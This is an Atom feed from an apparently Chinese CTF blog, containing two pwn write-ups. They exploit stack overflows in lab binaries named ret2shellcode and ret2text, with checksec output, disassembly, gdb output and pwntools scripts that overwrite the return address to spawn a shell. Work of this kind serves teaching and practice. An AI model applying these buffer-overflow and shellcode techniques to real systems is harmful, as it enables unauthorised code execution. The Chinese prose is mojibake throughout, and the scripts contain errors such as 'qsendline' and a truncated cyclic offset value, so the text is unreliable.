<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2021-07-14T12:48:20.670Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchuçš„blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[shellcode åŸºç¡€]]></title>
        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
        </link>
        <updated>2021-07-14T12:17:14.000Z</updated>
        <summary type="html"><![CDATA[<p>shellcodeåŸç†å°±æ˜¯è®©ç¨‹åºä¸­æŸä¸ªå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¿”å›åˆ°shellcodeçš„åœ°å€å»æ‰§è¡Œshellcodeï¼Œç›®çš„æ˜¯ä¸ºäº†è·å–shellï¼Œshellcodeæ˜¯æ ˆæº¢å‡ºä¸­ä¸€ç§ç®€å•ä¸”å¸¸è§„çš„æ“ä½œï¼Œéœ€è¦é…åˆropç­‰æŠ€æœ¯ä¸€èµ·ä½¿ç”¨ã€‚<br>
ret2shellcodeé¢˜å‹å–ret2textå·®ä¸å¤šï¼Œä½†ret2shellcodeæ²¡æœ‰/bin/sh åé—¨ç›´æ¥åˆ©ç”¨çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±æ„é€ shellcodeã€‚<br>
shellcodeï¼ˆæŒ‡ä»¤ä¸º:shellcode = asm(shellcraft.sh())ï¼‰<br>
é¢˜ç›®ret2shellcodeï¼Œåšé¢˜å‰éœ€è¦checksecä¸€ä¸‹æœ‰ä»€ä¹ˆä¿æŠ¤ä»¥åŠæ˜¯å¤šå°‘ä½çš„ç¨‹åº</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>åœ¨è¿™é‡Œå‘ç°æ˜¯32ä½ç¨‹åºè€Œä¸”å¼€äº†NXä¿æŠ¤æ‰“å¼€IDA32æŒ‰F5è¿›å…¥mainå‡½æ•°ä¼ªä»£ç </p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>å¾ˆæ˜æ˜¾è·Ÿret2textä¸€æ · æœ‰getsï¼ˆï¼‰å‡½æ•°å’Œstrncpyå‡½æ•°ï¼Œgetså‡½æ•°æ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸï¼Œå³æœ‰æº¢å‡º                                  //getsï¼ˆï¼‰ï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
æˆ‘ä»¬å…ˆæ‰¾buf2çš„åœ°å€ä½œä¸ºshellcode åœ°å€   åœ¨ida32å¾ˆå®¹æ˜“å‘ç°</p>
]]></summary>
        <content type="html"><![CDATA[<p>shellcodeåŸç†å°±æ˜¯è®©ç¨‹åºä¸­æŸä¸ªå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¿”å›åˆ°shellcodeçš„åœ°å€å»æ‰§è¡Œshellcodeï¼Œç›®çš„æ˜¯ä¸ºäº†è·å–shellï¼Œshellcodeæ˜¯æ ˆæº¢å‡ºä¸­ä¸€ç§ç®€å•ä¸”å¸¸è§„çš„æ“ä½œï¼Œéœ€è¦é…åˆropç­‰æŠ€æœ¯ä¸€èµ·ä½¿ç”¨ã€‚<br>
ret2shellcodeé¢˜å‹å–ret2textå·®ä¸å¤šï¼Œä½†ret2shellcodeæ²¡æœ‰/bin/sh åé—¨ç›´æ¥åˆ©ç”¨çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±æ„é€ shellcodeã€‚<br>
shellcodeï¼ˆæŒ‡ä»¤ä¸º:shellcode = asm(shellcraft.sh())ï¼‰<br>
é¢˜ç›®ret2shellcodeï¼Œåšé¢˜å‰éœ€è¦checksecä¸€ä¸‹æœ‰ä»€ä¹ˆä¿æŠ¤ä»¥åŠæ˜¯å¤šå°‘ä½çš„ç¨‹åº</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>åœ¨è¿™é‡Œå‘ç°æ˜¯32ä½ç¨‹åºè€Œä¸”å¼€äº†NXä¿æŠ¤æ‰“å¼€IDA32æŒ‰F5è¿›å…¥mainå‡½æ•°ä¼ªä»£ç </p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>å¾ˆæ˜æ˜¾è·Ÿret2textä¸€æ · æœ‰getsï¼ˆï¼‰å‡½æ•°å’Œstrncpyå‡½æ•°ï¼Œgetså‡½æ•°æ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸï¼Œå³æœ‰æº¢å‡º                                  //getsï¼ˆï¼‰ï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
æˆ‘ä»¬å…ˆæ‰¾buf2çš„åœ°å€ä½œä¸ºshellcode åœ°å€   åœ¨ida32å¾ˆå®¹æ˜“å‘ç°</p>
<!-- more -->
<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
<!-- more -->
<p>ç„¶åç¡®å®šæ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„ä½ç½®ï¼Œå¯ä»¥æ‰‹åŠ¨è®¡ç®—ï¼Œè¿™é‡Œä½¿ç”¨cyclicï¼›<br>
cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„åŠŸèƒ½ï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åœ¨å®Œæˆæº¢å‡ºé¢˜ç›®æ—¶ï¼Œä½¿ç”¨cyclic patternå¯ä»¥å¤§å¤§å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´ã€‚<br>
<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
å¯ä»¥å‘ç°åœ¨0x62616164ä¸­æº¢å‡º<br>
è¾“å…¥cyclic -l 0x0626164  å¯ä»¥å¾—åˆ°åç§»é‡ä¸º112<br>
å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payload<br>
payload=shellcode.ljust(112,'a')+p32ï¼ˆ0x0804A080)<br>
EXPå¦‚ä¸‹</p>
<pre><code>from pwn import *

q = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ„é€ åŸºæœ¬rop]]></title>
        <id>https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/</id>
        <link href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
        </link>
        <updated>2021-07-14T00:55:46.000Z</updated>
        <summary type="html"><![CDATA[<pre><code> èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚
</code></pre>
<p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ğŸ˜³<br>
é¢˜ç›®ret2text<br>
ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROP;<br>
åšé¢˜ç›®å‰é¦–å…ˆå¾—æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code> èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚
</code></pre>
<p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ğŸ˜³<br>
é¢˜ç›®ret2text<br>
ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROP;<br>
åšé¢˜ç›®å‰é¦–å…ˆå¾—æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p>
<!-- more -->
<p>Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)</p>
<!-- more -->
<p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºè¿™æ˜¯32ä½ç¨‹åºï¼Œåªå¼€äº†NXä¿æŠ¤<br>
æˆ‘ä»¬ç”¨ida32æ‰“å¼€æ–‡ä»¶   æŒ‰F5è¿›å…¥mainå‡½æ•°</p>
<!-- more -->
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
{<br>
char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
<p>setvbuf(stdout, 0, 2, 0);<br>
setvbuf(_bss_start, 0, 1, 0);<br>
puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
gets(s);<br>
printf(&quot;Maybe I will tell you next time !&quot;);<br>
return 0;<br>
}</p>
<!-- more -->
<p>å‘ç°getsï¼ˆï¼‰å‡½æ•°ï¼Œgetsæ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸ //getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
å†æŸ¥çœ‹å…¶ä»–å‡½æ•°å‘ç°/bin/sh          //ç»å…¸åé¢å‡½æ•°ç›´æ¥è¿›å…¥ç³»ç»Ÿ</p>
<!-- more -->
<p>void secure()<br>
{<br>
unsigned int v0; // eax<br>
int input; // [esp+18h] [ebp-10h] BYREF<br>
int secretcode; // [esp+1Ch] [ebp-Ch]</p>
<p>v0 = time(0);<br>
srand(v0);<br>
secretcode = rand();<br>
__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
if ( input == secretcode )<br>
system(&quot;/bin/sh&quot;);<br>
}</p>
<!-- more -->
<p>å†idaæ‰¾åˆ°/bin/shçš„åœ°å€</p>
<!-- more -->
<p>.text:080485FD                 push    ebp<br>
.text:080485FE                 mov     ebp, esp<br>
.text:08048600                 sub     esp, 28h<br>
.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
.text:0804860A                 call    _time<br>
.text:0804860F                 mov     [esp], eax      ; seed<br>
.text:08048612                 call    _srand<br>
.text:08048617                 call    _rand<br>
.text:0804861C                 mov     [ebp+secretcode], eax<br>
.text:0804861F                 lea     eax, [ebp+input]<br>
.text:08048622                 mov     [esp+4], eax<br>
.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
.text:0804862D                 call    ___isoc99_scanf<br>
.text:08048632                 mov     eax, [ebp+input]<br>
.text:08048635                 cmp     eax, [ebp+secretcode]<br>
.text:08048638                 jnz     short locret_8048646<br>
.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
.text:08048641                 call    _system</p>
<!-- more -->
<p>å‘ç°/bin/shåœ°å€åœ¨0x0804863A,è¿™æ˜¯bin_str=0x0804863Aï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç›´æ¥æ§åˆ¶ç¨‹åºè¿”å›è‡³ 0x0804863A<br>
ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ„é€  payload äº†ï¼Œä»getså¼€å§‹å¯»æ‰¾</p>
<!-- more -->
<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
.text:080486AB                 mov     [esp], eax      ; s<br>
.text:080486AE                 call    _gets</p>
<!-- more -->
<p>åˆ©ç”¨gdbæ¥æ‰“æ–­ç‚¹</p>
<!-- more -->
<p>pwndbg&gt; b *0x080486AE<br>
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
pwndbg&gt; r<br>
Starting program: /home/nianchu/Desktop/æ–°æ‰‹è®­ç»ƒ/ret2text<br>
There is something amazing here, do you know anything?</p>
<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
24	ret2text.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>
EAX  0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EBX  0x0<br>
ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) â—‚â€” 0xfb88900a<br>
EDX  0xf7fb8890 (_IO_stdfile_1_lock) â—‚â€” 0x0<br>
EDI  0x0<br>
ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x1d7d8c<br>
EBP  0xffffcf68 â—‚â€” 0x0<br>
ESP  0xffffcee0 â€”â–¸ 0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EIP  0x80486ae (main+102) â€”â–¸ 0xfffdade8 â—‚â€” 0xfffdade8</p>
<!-- more -->
<p>ä»ESPå¯ä»¥å‘ç°åœ¨espä¸º0xffffcee0ï¼Œebpä¸º0xffffcf68,sä¸º0xffffcefc<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6c<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4<br>
æœ€åpayloadæ„é€ å¦‚ä¸‹ï¼š</p>
<!-- more -->
<p>from pwn import*</p>
<p>q=process('./ret2text')<br>
bin_str=0x0804863A<br>
payload='a'*(0x6c+4)+p32(bin_str)<br>
q.sendline(payload)<br>
q.interactive()</p>
<!-- more -->
]]></content>
    </entry>
</feed>